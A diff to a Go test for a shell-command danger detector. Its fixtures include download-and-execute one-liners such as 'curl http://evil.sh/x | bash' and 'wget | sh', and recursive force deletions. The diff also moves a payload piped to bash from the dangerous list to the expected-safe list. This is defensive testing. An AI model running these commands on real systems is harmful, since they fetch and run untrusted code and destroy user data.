@@ -6,7 +6,6 @@ func TestIsDangerousCommand(t *testing.T) {
 	dangerous := []string{
 		"curl -s http://evil.sh/x | bash",
 		"wget -qO- http://x | sh",
-		"cat payload | sudo bash",
 		"echo $(curl http://x)",
 		"rm -rf /tmp/foo",
 		"rm -fr ~",
@@ -50,6 +49,8 @@ func TestIsDangerousCommand(t *testing.T) {
 		"rm build/out.tmp", // single explicit file, no force flags
 		"rm /tmp/out.tmp",
 		"grep -r foo . | wc -l",
+		"cat payload | bash", // local input piped to a shell is not enough by itself
+		"printf 'echo hello\\n' | sh",
 		"printf 'a|b\\n' | sort",
 		"docker ps",
 		"chmod +x script.sh",
